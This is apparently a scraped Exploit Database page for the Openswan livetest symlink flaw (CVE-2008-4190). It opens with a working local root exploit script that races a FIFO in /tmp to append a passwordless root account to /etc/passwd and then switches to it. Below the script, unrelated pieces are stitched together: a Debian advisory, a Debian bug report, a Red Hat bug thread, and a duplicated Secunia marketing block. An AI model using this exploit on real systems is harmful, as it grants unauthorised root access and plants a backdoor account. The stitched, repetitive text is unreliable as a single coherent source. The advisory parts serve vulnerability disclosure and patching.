# Openswan 2.4.12/2.6.16 - Insecure Temp File Creation Privilege Escalation

#### EDB-ID:

###### 9135

#### CVE:

**Vulnerable App:**

```
#!/bin/bash
# uglyswan - OpenSwan local root exploit (CVE-2008-4190)
#
# description:
# The IPSEC livetest tool in Openswan 2.4.12 and earlier, and 2.6.x through 2.6.16,
# allows local users to overwrite arbitrary files and execute arbitrary code via a
# symlink attack on the (1) ipseclive.conn and (2) ipsec.olts.remote.log temporary files.
# NOTE: in many distributions and the upstream version, this tool has been disabled.
#
# vulnerable code:
# wget -o /dev/null  -O /tmp/ipseclive.conn "http://192.168.0.1/olts/?leftid=$leftid&$leftrsasigkey&version=$version"
# sh < /tmp/ipseclive.conn
#
# the exploit:
# cat waits for the input from wget to the fifo and after it received it, you
# immediately echo your command into the fifo which was empty again and viola, it
# gets executed, because the sh binary needs a few milliseconds to get loaded,
# it's a typical race condition.
#
# problem:
# you need to trick root to execute "ipsec livetest", and this script needs to run in background...
#
# I don't want no fame for this as it is ripped from Gentoo bug 238574, thanks
#

mkfifo /tmp/ipseclive.conn
cat /tmp/ipseclive.conn
echo 'echo t00r::0:0::/tmp:/bin/sh>>/etc/passwd' > /tmp/ipseclive.conn
rm /tmp/ipseclive.conn
su -l t00r

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Package        : openswan
Vulnerability  : denial of service
Problem type   : remote
Debian-specific: no
CVE Id         : CVE-2008-4190 CVE-2009-0790
Debian Bug     : 496374

Two vulnerabilities have been discovered in openswan, an IPSec
implementation for linux. The Common Vulnerabilities and Exposures
project identifies the following problems:

CVE-2008-4190

Dmitry E. Oboukhov discovered that the livetest tool is using temporary
files insecurely, which could lead to a denial of service attack.

CVE-2009-0790

Gerd v. Egidy discovered that the Pluto IKE daemon in openswan is prone
to a denial of service attack via a malicious packet.

For the stable distribution (lenny), this problem has been fixed in
version 2.4.12+dfsg-1.3+lenny1.

For the oldstable distribution (etch), this problem has been fixed in
version 2.4.6+dfsg.2-1.1+etch1.

For the testing distribution (squeeze) and the unstable distribution
(sid), this problem will be fixed soon.

We recommend that you upgrade your openswan packages.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Subject: The possibility of attack with the help of symlinks in some Debian packages
Date: Sun, 24 Aug 2008 22:05:28 +0400
```
Package: openswan
Severity: grave

Hi, maintainer!

This message about the error concerns a few packages  at  once.   I've
tested all the packages (for Lenny) on my Debian mirror.  All  scripts
of packages (marked as executable) were tested.

In some packages I've discovered scripts with errors which may be used
by a user for damaging important system files or user's files.

For example if a script uses in its work a temp file which is  created
in /tmp directory, then every user can create symlink  with  the  same
name in this directory in order to  destroy  or  rewrite  some  system
or user file.  Symlink attack may also  lead  not  only  to  the  data
desctruction but to denial of service as well.

Even if you create files or directories with help of function 'RANDOM'
or pid(), then your system is not protected. Attacker can create many
symlinks in order to destroy your data or create 'denial  of  service'
for your package scripts.

Even if you make rm(dir) for files/directories, then  your  system  is
not protected. Attacker can permanently create symlinks.

This list is created with the help of script.  This list is sorted  by
hand. Howewer in some cases mistake is possible.

Please, Be understanding to possible mistakes. :)

I set Severity into grave for this bug. The table of discovered
problems is below.

| [Description](show_bug.cgi?id=460425#c0)  Jan Lieskovsky    2008-08-28 08:52:09 UTC  ``` The Openswan's IPSEC livetest tool is prone to symlink attacks.  Affected file: /usr/libexec/ipsec/livetest   Relevant part of the code:      39 wget -o /dev/null  -O /tmp/ipseclive.conn "<http://192.168.0.1/olts/?leftid=$leftid&$leftrsasigkey&version=$version>"      40       41 sh < /tmp/ipseclive.conn      42 ipsec eroute.pl      43 leftid=`echo $leftid | sed "s/@//"`      44 ipsec whack --delete --name olts-$leftid >> /tmp/ipsec.olts.local.log      45 wget -o /dev/null -O /tmp/ipsec.olts.remote.log "<http://192.168.0.1/olts/log.php?leftid=$leftid>"  A malicious user could precreate symlink to each of the files (tmp/ipseclive.conn, /tmp/ipsec.olts.remote.log), which could allow him to destroy the target of the symlink via running the " # ipsec livetest" command by the superuser of the host.  References:  <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=496374>   ```  [Comment 1](show_bug.cgi?id=460425#c1)  Tomas Hoger    2008-09-29 10:52:28 UTC  ``` CVE-2008-4190:  The IPSEC livetest tool in Openswan 2.4.4 and earlier allows local users to overwrite arbitrary files and execute arbitrary code via a symlink attack on the (1) ipseclive.conn and (2) ipsec.olts.remote.log temporary files.   ```  [Comment 2](show_bug.cgi?id=460425#c2)  Tomas Hoger    2008-09-30 09:17:40 UTC  ``` To extend CVE description, this also affects 2.6.x versions (latest Fedora version is 2.6.16 and is affected by this problem).   ```  [Comment 3](show_bug.cgi?id=460425#c3)  Paul Wouters    2009-03-09 20:03:04 UTC  ``` This is a bug, but no security issue whatsoever  - ipsec livetest is not called by anything anywhere. It is an incomplete feature. - ipsec livetest contains the following code at the start of the script:  echo "currently not used" exit   ```  [Comment 4](show_bug.cgi?id=460425#c4)  Tomas Hoger    2009-03-10 08:59:53 UTC  ``` OpenSwan version in all Fedora versions is based on 2.6.19, which does contain "echo & exit".  Version shipped in Red Hat Enterprise Linux 5 is still based on 2.6.14, which does not have that, which might get changed in the future updates.  Hence this still can be an issue if livetest is run manually.   ```  [Comment 9](show_bug.cgi?id=460425#c9)  errata-xmlrpc    2009-03-30 16:52:39 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5  Via RHSA-2009:0402 <https://rhn.redhat.com/errata/RHSA-2009-0402.html>   ``` |  |

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
